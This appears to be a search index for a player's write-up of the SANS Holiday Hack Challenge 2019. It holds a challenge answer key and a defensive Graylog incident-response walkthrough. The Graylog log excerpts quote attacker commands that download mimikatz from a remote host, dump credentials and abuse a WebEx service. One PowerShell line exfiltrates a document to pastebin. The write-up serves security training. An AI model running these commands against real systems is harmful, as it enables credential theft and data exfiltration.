{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to KringleCon 2 \u00b6 by Salaheldin \u2728 Let's travel! \u00b6 Go to the ticket shop and buy you exclusive pass ticket for the event at the North Pole After arriving at the North Pole station, you will find Santa waiting for you there. \ud83c\udf85 Santa Welcome You! Welcome to the North Pole and KringleCon 2! Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded. We moved the event to Elf University (Elf U for short), the North Pole\u2019s largest venue. Please feel free to explore, watch talks, and enjoy the con! \ud83d\uddfa Map \u00b6 This a preview of a very high quality map for ELF University. To zoom and check the details please download the full quality. click here : \u00b6 \ud83c\udff5 Objectives \u00b6 Check the objectives in your badge, You will have the 6 objectives then unlock new objective by talking to the elves you find in the university: Objective Type Location Tools 0/ Talk to Santa in the Quad Talk The Quad 1/ Find the Turtle Doves Explore The student union 2/ Unredact Threatening Document Explore The Quad 3/ Windows Log Analysis : Evaluate Attack Outcome Logs Analysis The event log data DeepBlueCLI 4/ Windows Log Analysis : Determine Attacker Technique Logs Analysis The normalized Sysmon logs EQL 5/ Windows Log Analysis : Determine Compromised System Logs Analysis Zeek logs RITA 6/ Spunk SOC Splnuk Server Splunk 7/ Get Access To The Steam Tunnels Multi Minty's dorm room Multi 8/ Bypassing the Frido Sleigh CAPTEHA Machine Learning fridosleigh Python 9/ Retrieve Scraps of Paper from Server SQL Injection Student Portal Sqlmap 10/ Recover Cleartext Document Reverse Engineering elfscrow app IDA 11/ Open the Sleigh Shop Door Web Dev Carte Web Dev 12/ Filter Out Poisoned Sources of Weather Data Logs Analysis SLEIGH ROUTE FINDER API jq \ud83c\udf97Helping the elves Challenges \u00b6 As we walk around, we can find various challenges, and as we talk to the elves standing near them, we get some hints. Challenge Type Direct Url Elf Location 1 Escape Ed Ed editor Link Bushy Evergreen The train station 2 Linux Path Linux Link SugarPlum Mary The Hermey Hall 3 Xmas laser cheers Powershell Link Sparkle Redberry The Laboratory 4 Splunk - The training questions SOC - Splunk Link Professor Banas The Laboratory 5 Mongo Pilfer MongoDB Link Holly Evergreen Netwars Room 6 Nyanshell Linux Shell Link Alabaster Snowball The Speaker UNpreparedness Room 7 Frosty Keypad Keypad Link Tangle Coalbox The Quad 8 Holiday Hack trail Web Pentest Link Minty Candycane The Dorm 9 Get Access To The Steam Tunnels Key Bitting Link1 Link2 Krampus Minty's Room 10 Graylog Log Analysis Link Pepper Minstix The Dorm 11Smart Braces Iptables link Kent Tinseltooth Student Union 12 Zeek JSON Analysis Log Analysis Link Wunorse Openslae Sleigh Shop \ud83d\udcdf The Answers \u00b6 1. Find the Turtle Doves? At the fire in the student union 2. Unredact Threatening Document DEMAND 3. Windows Log Analysis: Evaluate Attack Outcome supatree 4. Windows Log Analysis: Determine Attacker Technique ntdsutil 5. Windows Log Analysis: Determine Compromised System 192.168.134.130 6. Splunk Kent you are so unfair. And we were going to make you the king of the Winter Carnival. 7. Get Access To The Steam Tunnels Krampus Hollyfeld 8. Bypassing the Frido Sleigh CAPTEHA 8Ia8LiZEwvyZr2WO 9. Retrieve Scraps of Paper from Server super sled-o-matic 10. Recover Cleartext Document Machine Learning Sleigh Route Finder 11. Open the Sleigh Shop Door The Tooth Fairy 12. Filter Out Poisoned Sources of Weather Data 0807198508261964 \ud83c\udfc6 The END \u00b6 Go to the Bell Tower after last objective: \ud83c\udf85 Santa! You did it! Thank you! You uncovered the sinister plot to destroy the holiday season! Through your diligent efforts, we\u2019ve brought the Tooth Fairy to justice and saved the holidays! Ho Ho Ho! The more I laugh, the more I fill with glee. And the more the glee, The more I'm a merrier me! Merry Christmas and Happy Holidays. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld ongratulations on a job well done! Oh, by the way, I won the Frido Sleigh contest. I got 31.8% of the prizes, though I'll have to figure that out. \ud83e\uddda\ud83c\udffb\u200d\u200d The Tooth Fairy You foiled my dastardly plan! I\u2019m ruined! And I would have gotten away with it too, if it weren't for you meddling kids! Look in the corner you will find a letter Jack Frost! \u26a1\ufe0f Extra \u00b6 Easter Eggs \u00b6 In Santa\u2019s Naughty List: Holiday Themed Social Engineering talk by snow We see a phone number \ud83d\udcde 605-313-4000 and if you call the number you hear Santa's Hotline! Also the website northpolelnc.com with l instead of i lead to Snow's twitter account . Kringlcon twitter list \u00b6 Here a list of Kringlecon team and speakers to follow on twitter: https://twitter.com/i/lists/1216115053642100737?s=20 Speakers \u00b6 John Strand, Keynote: A Hunting We Must Go Katie Knowles, How to (Holiday) Hack It: Tips for Crushing CTFs & Pwning Pentests Snow, Santa\u2019s Naughty List: Holiday Themed Social Engineering James Brodsky, Dashing Through the Logs Ron Bowes, Reversing Crypto the Easy Way Chris Elgee, Web Apps: A Trailhead Chris Davis, Machine Learning Use Cases for Cybersecurity Deviant Ollam, Optical Decoding of Keys Dave Kennedy, Telling Stories from the North Pole Mark Baggett, Logs? Where we're going we don't need logs. Heather Mahalik, When Malware Goes Mobile, Quick Detection is Critical John Hammond, 5 Steps to Build and Lead a Team of Holly Jolly Hackers Lesley Carhart, Over 90,000: Ups and Downs of my InfoSec Twitter Journey Talks videos \u00b6 https://www.youtube.com/playlist?list=PLjLd1hNA7YVzyhhqBQaW-tF45xnS6oHAP Credit \u00b6 Credit SANS Holiday Hack Challenge 2019 KringleCon 2: Turtle Doves Direction Ed Skoudis Technical Lead Joshua Wright Narrative / Story Ed Skoudis World Builder Lead Evan Booth Programming Evan Booth Ron Bowes Chris Davis Chris Elgee Matt Toussain Joshua Wright System Builds & Administration Tom Hessman Daniel Pendolino Artwork Evan Booth Chris Davis Chris Elgee Kimberly Elliott Brian Hostetler Annie Royal Ed Skoudis Challenge Development Jim Apger Evan Booth Ron Bowes James Brodsky Gary Burgett Andy Cooper Chris Davis Chris Elgee Tim Frazier Dave Herrald Ryan Kovar Marcus Laferrera Brett Leaver Lily Lee Devian Ollam Daniel Pendolino John Stoner Matt Toussain David Veuve Robert Wagner Joshua Wright Soundtrack Dual Core Ninjula Josh Skoudis Website Design Tom Hessman Conference Scheduler and Speaker Wrangler Chris Fleener Testing and Feedback Ron Bowes Chris Elgee Tom Hessman Brian Hostetler Ryan Huffer Daniel Pendolino Lynn Schifano Ed Skoudis Joshua Wright KringleCon Speakers Ed Skoudis - Host John Strand - Keynote Mark Baggett Ron Bowes James Brodsky Lesley Carhart Ian Coldwater Chris Davis Chris Elgee John Hammond Dave Kennedy Katie Knowles Heather Mahalik Deviant Ollam Sn0w Marketing Chris Fleener Sponsored Hosting Services Google Special Thanks The SANS Institute \u00a9 Copyright SANS Institute, 2019. All Rights Reserved. Narrative \u00b6 Narrative Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep... Resources \u00b6 Virtual Machines I used: Slingshot from SANS. Windows 10 VM Recording terminal: asciinema","title":"Home"},{"location":"#welcome-to-kringlecon-2","text":"by Salaheldin","title":"Welcome to KringleCon 2"},{"location":"#lets-travel","text":"Go to the ticket shop and buy you exclusive pass ticket for the event at the North Pole After arriving at the North Pole station, you will find Santa waiting for you there. \ud83c\udf85 Santa Welcome You! Welcome to the North Pole and KringleCon 2! Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded. We moved the event to Elf University (Elf U for short), the North Pole\u2019s largest venue. Please feel free to explore, watch talks, and enjoy the con!","title":"\u2728 Let's travel!"},{"location":"#map","text":"This a preview of a very high quality map for ELF University.","title":"\ud83d\uddfa Map"},{"location":"#to-zoom-and-check-the-details-please-download-the-full-quality-click-here","text":"","title":"To zoom and check the details please download the full quality. click here:"},{"location":"#objectives","text":"Check the objectives in your badge, You will have the 6 objectives then unlock new objective by talking to the elves you find in the university: Objective Type Location Tools 0/ Talk to Santa in the Quad Talk The Quad 1/ Find the Turtle Doves Explore The student union 2/ Unredact Threatening Document Explore The Quad 3/ Windows Log Analysis : Evaluate Attack Outcome Logs Analysis The event log data DeepBlueCLI 4/ Windows Log Analysis : Determine Attacker Technique Logs Analysis The normalized Sysmon logs EQL 5/ Windows Log Analysis : Determine Compromised System Logs Analysis Zeek logs RITA 6/ Spunk SOC Splnuk Server Splunk 7/ Get Access To The Steam Tunnels Multi Minty's dorm room Multi 8/ Bypassing the Frido Sleigh CAPTEHA Machine Learning fridosleigh Python 9/ Retrieve Scraps of Paper from Server SQL Injection Student Portal Sqlmap 10/ Recover Cleartext Document Reverse Engineering elfscrow app IDA 11/ Open the Sleigh Shop Door Web Dev Carte Web Dev 12/ Filter Out Poisoned Sources of Weather Data Logs Analysis SLEIGH ROUTE FINDER API jq","title":"\ud83c\udff5 Objectives"},{"location":"#helping-the-elves-challenges","text":"As we walk around, we can find various challenges, and as we talk to the elves standing near them, we get some hints. Challenge Type Direct Url Elf Location 1 Escape Ed Ed editor Link Bushy Evergreen The train station 2 Linux Path Linux Link SugarPlum Mary The Hermey Hall 3 Xmas laser cheers Powershell Link Sparkle Redberry The Laboratory 4 Splunk - The training questions SOC - Splunk Link Professor Banas The Laboratory 5 Mongo Pilfer MongoDB Link Holly Evergreen Netwars Room 6 Nyanshell Linux Shell Link Alabaster Snowball The Speaker UNpreparedness Room 7 Frosty Keypad Keypad Link Tangle Coalbox The Quad 8 Holiday Hack trail Web Pentest Link Minty Candycane The Dorm 9 Get Access To The Steam Tunnels Key Bitting Link1 Link2 Krampus Minty's Room 10 Graylog Log Analysis Link Pepper Minstix The Dorm 11Smart Braces Iptables link Kent Tinseltooth Student Union 12 Zeek JSON Analysis Log Analysis Link Wunorse Openslae Sleigh Shop","title":"\ud83c\udf97Helping the elves Challenges"},{"location":"#the-answers","text":"1. Find the Turtle Doves? At the fire in the student union 2. Unredact Threatening Document DEMAND 3. Windows Log Analysis: Evaluate Attack Outcome supatree 4. Windows Log Analysis: Determine Attacker Technique ntdsutil 5. Windows Log Analysis: Determine Compromised System 192.168.134.130 6. Splunk Kent you are so unfair. And we were going to make you the king of the Winter Carnival. 7. Get Access To The Steam Tunnels Krampus Hollyfeld 8. Bypassing the Frido Sleigh CAPTEHA 8Ia8LiZEwvyZr2WO 9. Retrieve Scraps of Paper from Server super sled-o-matic 10. Recover Cleartext Document Machine Learning Sleigh Route Finder 11. Open the Sleigh Shop Door The Tooth Fairy 12. Filter Out Poisoned Sources of Weather Data 0807198508261964","title":"\ud83d\udcdf The Answers"},{"location":"#the-end","text":"Go to the Bell Tower after last objective: \ud83c\udf85 Santa! You did it! Thank you! You uncovered the sinister plot to destroy the holiday season! Through your diligent efforts, we\u2019ve brought the Tooth Fairy to justice and saved the holidays! Ho Ho Ho! The more I laugh, the more I fill with glee. And the more the glee, The more I'm a merrier me! Merry Christmas and Happy Holidays. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus Hollyfeld ongratulations on a job well done! Oh, by the way, I won the Frido Sleigh contest. I got 31.8% of the prizes, though I'll have to figure that out. \ud83e\uddda\ud83c\udffb\u200d\u200d The Tooth Fairy You foiled my dastardly plan! I\u2019m ruined! And I would have gotten away with it too, if it weren't for you meddling kids! Look in the corner you will find a letter Jack Frost!","title":"\ud83c\udfc6 The END"},{"location":"#extra","text":"","title":"\u26a1\ufe0f Extra"},{"location":"#easter-eggs","text":"In Santa\u2019s Naughty List: Holiday Themed Social Engineering talk by snow We see a phone number \ud83d\udcde 605-313-4000 and if you call the number you hear Santa's Hotline! Also the website northpolelnc.com with l instead of i lead to Snow's twitter account .","title":"Easter Eggs"},{"location":"#kringlcon-twitter-list","text":"Here a list of Kringlecon team and speakers to follow on twitter: https://twitter.com/i/lists/1216115053642100737?s=20","title":"Kringlcon twitter list"},{"location":"#speakers","text":"John Strand, Keynote: A Hunting We Must Go Katie Knowles, How to (Holiday) Hack It: Tips for Crushing CTFs & Pwning Pentests Snow, Santa\u2019s Naughty List: Holiday Themed Social Engineering James Brodsky, Dashing Through the Logs Ron Bowes, Reversing Crypto the Easy Way Chris Elgee, Web Apps: A Trailhead Chris Davis, Machine Learning Use Cases for Cybersecurity Deviant Ollam, Optical Decoding of Keys Dave Kennedy, Telling Stories from the North Pole Mark Baggett, Logs? Where we're going we don't need logs. Heather Mahalik, When Malware Goes Mobile, Quick Detection is Critical John Hammond, 5 Steps to Build and Lead a Team of Holly Jolly Hackers Lesley Carhart, Over 90,000: Ups and Downs of my InfoSec Twitter Journey","title":"Speakers"},{"location":"#talks-videos","text":"https://www.youtube.com/playlist?list=PLjLd1hNA7YVzyhhqBQaW-tF45xnS6oHAP","title":"Talks videos"},{"location":"#credit","text":"Credit SANS Holiday Hack Challenge 2019 KringleCon 2: Turtle Doves Direction Ed Skoudis Technical Lead Joshua Wright Narrative / Story Ed Skoudis World Builder Lead Evan Booth Programming Evan Booth Ron Bowes Chris Davis Chris Elgee Matt Toussain Joshua Wright System Builds & Administration Tom Hessman Daniel Pendolino Artwork Evan Booth Chris Davis Chris Elgee Kimberly Elliott Brian Hostetler Annie Royal Ed Skoudis Challenge Development Jim Apger Evan Booth Ron Bowes James Brodsky Gary Burgett Andy Cooper Chris Davis Chris Elgee Tim Frazier Dave Herrald Ryan Kovar Marcus Laferrera Brett Leaver Lily Lee Devian Ollam Daniel Pendolino John Stoner Matt Toussain David Veuve Robert Wagner Joshua Wright Soundtrack Dual Core Ninjula Josh Skoudis Website Design Tom Hessman Conference Scheduler and Speaker Wrangler Chris Fleener Testing and Feedback Ron Bowes Chris Elgee Tom Hessman Brian Hostetler Ryan Huffer Daniel Pendolino Lynn Schifano Ed Skoudis Joshua Wright KringleCon Speakers Ed Skoudis - Host John Strand - Keynote Mark Baggett Ron Bowes James Brodsky Lesley Carhart Ian Coldwater Chris Davis Chris Elgee John Hammond Dave Kennedy Katie Knowles Heather Mahalik Deviant Ollam Sn0w Marketing Chris Fleener Sponsored Hosting Services Google Special Thanks The SANS Institute \u00a9 Copyright SANS Institute, 2019. All Rights Reserved.","title":"Credit"},{"location":"#narrative","text":"Narrative Whose grounds these are, I think I know His home is in the North Pole though He will not mind me traipsing here To watch his students learn and grow Some other folk might stop and sneer \"Two turtle doves, this man did rear?\" I'll find the birds, come push or shove Objectives given: I'll soon clear Upon discov'ring each white dove, The subject of much campus love, I find the challenges are more Than one can count on woolen glove. Who wandered thus through closet door? Ho ho, what's this? What strange boudoir! Things here cannot be what they seem That portal's more than clothing store. Who enters contests by the ream And lives in tunnels meant for steam? This Krampus bloke seems rather strange And yet I must now join his team... Despite this fellow's funk and mange My fate, I think, he's bound to change. What is this contest all about? His victory I shall arrange! To arms, my friends! Do scream and shout! Some villain targets Santa's route! What scum - what filth would seek to end Kris Kringle's journey while he's out? Surprised, I am, but \"shock\" may tend To overstate and condescend. 'Tis little more than plot reveal That fairies often do extend And yet, despite her jealous zeal, My skills did win, my hacking heal! No dental dealer can so keep Our red-clad hero in ordeal! This Christmas must now fall asleep, But next year comes, and troubles creep. And Jack Frost hasn't made a peep, And Jack Frost hasn't made a peep...","title":"Narrative"},{"location":"#resources","text":"Virtual Machines I used: Slingshot from SANS. Windows 10 VM Recording terminal: asciinema","title":"Resources"},{"location":"terminals/","text":"Terminals & Portals \u00b6 Don't tell Santa! \u00b6 Here you can access all terminals challenges and play without need to going to kringlcon (Won't recored the results into your badge progress). Terminals \u00b6 Escape Ed | Linux Path | Xmas laser cheers | MongoDB | Nyanshell | Frosty-Keypad | Holiday Hack Trail | Fridosleigh | Iptables | Zeek JSON Analysis | Graylog | Graylog IR Report Reload Terminal Portals \u00b6 Splunk Studentportal","title":"Terminals & Portals"},{"location":"terminals/#terminals-portals","text":"","title":"Terminals &amp; Portals"},{"location":"terminals/#dont-tell-santa","text":"Here you can access all terminals challenges and play without need to going to kringlcon (Won't recored the results into your badge progress).","title":"Don't tell Santa!"},{"location":"terminals/#terminals","text":"Escape Ed | Linux Path | Xmas laser cheers | MongoDB | Nyanshell | Frosty-Keypad | Holiday Hack Trail | Fridosleigh | Iptables | Zeek JSON Analysis | Graylog | Graylog IR Report Reload Terminal","title":"Terminals"},{"location":"terminals/#portals","text":"Splunk Studentportal","title":"Portals"},{"location":"helptheelves/challenge1/","text":"\ud83c\udfae Escape Ed \u00b6 \ud83d\udccd Train station \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Bushy Evergreen Hi, I'm Bushy Evergreen. Welcome to Elf U! I'm glad you're here. I'm the target of a terrible trick. Pepper Minstix is at it again, sticking me in a text editor. Pepper is forcing me to learn ed. Even the hint is ugly. Why can't I just use Gedit? Please help me just quit the grinchy thing. ed Editor Basics Ed Is The Standard Text Editor Quit the ed editor. \u26a1\ufe0f Solution \u00b6 When You open the Cranberry Pi terminal, You see: After checking Ed Editor documentation, You will find it's easily quit the editor by giving the command q . You have completed the Escape Ed challenge! \ud83c\udf89 Talk to Bushy Evergreen again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Bushy Evergreen Wow, that was much easier than I'd thought. Maybe I don't need a clunky GUI after all! Have you taken a look at the password spray attack artifacts? I'll bet that DeepBlueCLI tool is helpful. You can check it out on GitHub. It was written by that Eric Conrad. He lives in Maine - not too far from here! Check your badge for the hints. \ud83c\udf93 What you've learned\u00b6 \u00b6 Always consult the documentation. How to exit an Ed editor.","title":"Escape Ed"},{"location":"helptheelves/challenge1/#escape-ed","text":"\ud83d\udccd Train station \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Bushy Evergreen Hi, I'm Bushy Evergreen. Welcome to Elf U! I'm glad you're here. I'm the target of a terrible trick. Pepper Minstix is at it again, sticking me in a text editor. Pepper is forcing me to learn ed. Even the hint is ugly. Why can't I just use Gedit? Please help me just quit the grinchy thing. ed Editor Basics Ed Is The Standard Text Editor Quit the ed editor.","title":"\ud83c\udfae Escape Ed"},{"location":"helptheelves/challenge1/#solution","text":"When You open the Cranberry Pi terminal, You see: After checking Ed Editor documentation, You will find it's easily quit the editor by giving the command q . You have completed the Escape Ed challenge! \ud83c\udf89 Talk to Bushy Evergreen again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Bushy Evergreen Wow, that was much easier than I'd thought. Maybe I don't need a clunky GUI after all! Have you taken a look at the password spray attack artifacts? I'll bet that DeepBlueCLI tool is helpful. You can check it out on GitHub. It was written by that Eric Conrad. He lives in Maine - not too far from here! Check your badge for the hints.","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge1/#what-youve-learned","text":"Always consult the documentation. How to exit an Ed editor.","title":"\ud83c\udf93 What you've learned\u00b6"},{"location":"helptheelves/challenge10/","text":"\ud83c\udfae Graylog \u00b6 \ud83d\udccd The dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Pepper Minstix It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent . Graylog Graylog Docs Event IDs and Sysmon (Events and Sysmon) Complete Incident Response Report questions \u26a1\ufe0f Solution \u00b6 Login to graylog server with the username elfustudent and password elfustudent . Check ElfU Graylog Incident Response Report from right-bottom corner or from this Link Select All messages stream to search and make sure to select search in all message at upper-left corner: Question 1 \u00b6 What is the full-path + filename of the first malicious file downloaded by Minty? Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. and use regular expressions to include or exclude patterns. Search query: minty AND EventID:2 AND ProcessImage:/.*firefox.*/ NOT TargetFilename:/.*\\.temp/ minty the name of the user account. EventID:2 A process changed a file creation time. The change file creation time event is registered when a file creation time is explicitly modified by a process. 1 AND ProcessImage:/.*firefox.*/ Check for events for Firefox app . NOT TargetFilename:/.*\\.temp/ Exclude temp folder from search. The answer C:\\Users\\minty\\Downloads\\cookie_recipe.exe Question 2 \u00b6 What was the ip:port the malicious file connected to first? The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. We can pivot off the answer to our first question using the binary path as our ProcessImage. Search query: EventID:3 AND ProcessImage:/.*cookie_recipe.exe/ EventID:3 Network connection. The network connection event logs TCP/UDP connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names IP addresses, port numbers and IPv6 status. ProcessImage:/.*cookie_recipe.exe/ Check for events by the process cookie_recipe.exe . The answer 192.168.247.175:4444 Question 3 \u00b6 What was the first command executed by the attacker? (answer is a single word) Since all commands sysmon event id 1 by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp . Search query ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe OR We can follow the previous question result and use timestamp to search surrounding events for example 30 seconds and also include Commandline Select Show surrounding messages > 30 seconds Add ParentProcessImage:/.*cookie_recipe.exe/ to check for events where the parent process is cookie_recipe.exe . Add _exists_:CommandLine to lookup for events with CommandLine. Select CommandLine and ParentProcessImage from left panel to show them Search query: source:\"elfu\\-res\\-wks1\" AND gl2_source_input:\"5defd222adbe1d0012fab8ca\"AND ParentProcessImage:/.*cookie_recipe.exe/ AND _exists_:CommandLine Sort result by timestamp to see the result in time order: The answer whoami Question 4 \u00b6 What is the one-word service name the attacker used to escalate privileges? Continuing on using the cookie_reciper.exe binary as our ParentProcessImage , we should see some more commands later on related to a service in the previous question result if you follow the events in time order: What initially got our attention is that webexservice launched by the malicious executable that even though this service is designed to update WebEx , it could also be used to launch other programs. C : \\ Windows \\ system32 \\ cmd . exe / c \"sc start webexservice a software-update 1 wmic process call create \" cmd . exe / c C : \\ Users \\ minty \\ Downloads \\ cookie_recipe2 . exe \" \" As the service is running under the System account, any executable launched by it would be launched with the same permissions. The WebexService service does not automatically start when Windows starts. Instead, it is called as necessary to perform an update of WebEx, or in this case, other programs. It's known Unusual Remote Execution Bug in Cisco WebEx Discovered by Researchers. The answer webexservice Question 5 \u00b6 What is the file-path + filename of the binary ran by the attacker to dump credentials? As we read the events in timestamp order, next we see attacker downloaded cookie_recipe2.exe using Invoke-WebRequest cmdlet then the attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe . Let's use this binary path in our ParentProcessImage search. ParentProcessImage:/.*cookie_recipe2.exe/ We notice that the attacker downloaded Mimikatz tool which known for exploit security flaws and gather credentials. And he renamed it to cookie.exe and saved at C:\\cookie.exe C : \\ Windows \\ system32 \\ cmd . exe / c \"Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\\cookie.exe \" Then run sekurlsa::logonpasswords command to dump credentials which known for mimikatz tool to output all of passwords stored on the machine C : \\ Windows \\ system32 \\ cmd . exe / c \"C:\\cookie.exe \" privilege :: debug \" \" sekurlsa :: logonpasswords \" exit \" The answer C:\\cookie.exe Question 6 \u00b6 Which account name was used to pivot to another machine? The attacker pivoted to another workstation using credentials gained from Minty's computer. Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. Search query: SourceNetworkAddress:192.168.247.175 AND EventID:4624 Use left panel to show different Fields from the events Directly we know which account was used. The answer alabaster Question 7 \u00b6 What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine? Search using LogonType 10 which mean RemoteInteractive when you access a computer through Terminal Services, Remote Desktop or Remote Assistance. Search query: SourceNetworkAddress:192.168.247.175 AND LogonType:10 The answer 06:04:28 Question 8: \u00b6 What is the SourceHostName, DestinationHostname, LogonType of the following connection?\" The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. (submit in that order as csv) The attacker has GUI access to the host elfu-res-wks2 via RDP. They likely use this GUI connection to access the file system of third host using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3 . Using LogonType 3 which in most cases when you access a computer from elsewhere on the network. over-the-network logons are classed as logon type 3. and Event ID 4624 an account was successfully logged on. Search query: SourceHostName:ELFU\\-RES\\-WKS2 AND LogonType:3 AND EventID:4624 The answer elfu-res-wks2,elfu-res-wks3,3 Question 9 \u00b6 What is the full-path + filename of the secret research document after being transferred from the third host to the second host? We can look for EventID:2 sysmon file creation event , and set the source machine elfu-res-wks2 , also use regex to filter out overly common file paths using something like: EventID:2 AND NOT TargetFilename:/.+AppData.+/ AND NOT TargetFilename:/.+ProgramData.+/ AND source:elfu\\-res\\-wks2 The answer C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf Question 10 \u00b6 What is the IPv4 address (as found in logs) the secret research document was exfiltrated to? We can look for the original document in CommandLine using regex with the document name super_secret_elfu_research.pdf . Search query: super_secret_elfu_research.pdf The attacker used Invoke-WebRequest cmdlet to post the file to a remote URL of https://pastebin.com/post.php . C : \\ Windows \\ SysWOW64 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe Invoke-WebRequest -Uri https : // pastebin . com / post . php -Method POST -Body @{ \"submit_hidden\" = \"submit_hidden\" ; \"paste_code\" = $( [Convert] :: ToBase64String ( [IO.File] :: ReadAllBytes ( \"C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf\" ))); \"paste_format\" = \"1\" ; \"paste_expire_date\" = \"N\" ; \"paste_private\" = \"0\" ; \"paste_name\" = \"cookie recipe\" } We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com . DestinationHostname:pastebin.com AND EventID:3 AND source:elfu\\-res\\-wks2 The answer 104.22.3.84 You have completed the Graylog challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Searching through logs using Graylog. Sysmon event id Logon types Tracing malicious Files and attacks locally and over network WebEx vulnerability https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624 http://techgenix.com/logon-types/ \u21a9 https://blog.skullsecurity.org/2018/technical-rundown-of-webexec https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html https://www.bleepingcomputer.com/news/security/unusual-remote-execution-bug-in-cisco-webex-discovered-by-researchers/ \u21a9","title":"Graylog"},{"location":"helptheelves/challenge10/#graylog","text":"\ud83d\udccd The dorm \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Pepper Minstix It's me - Pepper Minstix. Normally I'm jollier, but this Graylog has me a bit mystified. Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala. Some Elf U computers were hacked, and I've been tasked with performing incident response. Can you help me fill out the incident response report using our instance of Graylog? It's probably helpful if you know a few things about Graylog. Event IDs and Sysmon are important too. Have you spent time with those? Don't worry - I'm sure you can figure this all out for me! Click on the All messages Link to access the Graylog search interface! Make sure you are searching in all messages! The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner. Login with the username elfustudent and password elfustudent . Graylog Graylog Docs Event IDs and Sysmon (Events and Sysmon) Complete Incident Response Report questions","title":"\ud83c\udfae Graylog"},{"location":"helptheelves/challenge10/#solution","text":"Login to graylog server with the username elfustudent and password elfustudent . Check ElfU Graylog Incident Response Report from right-bottom corner or from this Link Select All messages stream to search and make sure to select search in all message at upper-left corner:","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge10/#question-1","text":"What is the full-path + filename of the first malicious file downloaded by Minty? Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file. We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files. and use regular expressions to include or exclude patterns. Search query: minty AND EventID:2 AND ProcessImage:/.*firefox.*/ NOT TargetFilename:/.*\\.temp/ minty the name of the user account. EventID:2 A process changed a file creation time. The change file creation time event is registered when a file creation time is explicitly modified by a process. 1 AND ProcessImage:/.*firefox.*/ Check for events for Firefox app . NOT TargetFilename:/.*\\.temp/ Exclude temp folder from search. The answer C:\\Users\\minty\\Downloads\\cookie_recipe.exe","title":"Question 1"},{"location":"helptheelves/challenge10/#question-2","text":"What was the ip:port the malicious file connected to first? The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. We can pivot off the answer to our first question using the binary path as our ProcessImage. Search query: EventID:3 AND ProcessImage:/.*cookie_recipe.exe/ EventID:3 Network connection. The network connection event logs TCP/UDP connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names IP addresses, port numbers and IPv6 status. ProcessImage:/.*cookie_recipe.exe/ Check for events by the process cookie_recipe.exe . The answer 192.168.247.175:4444","title":"Question 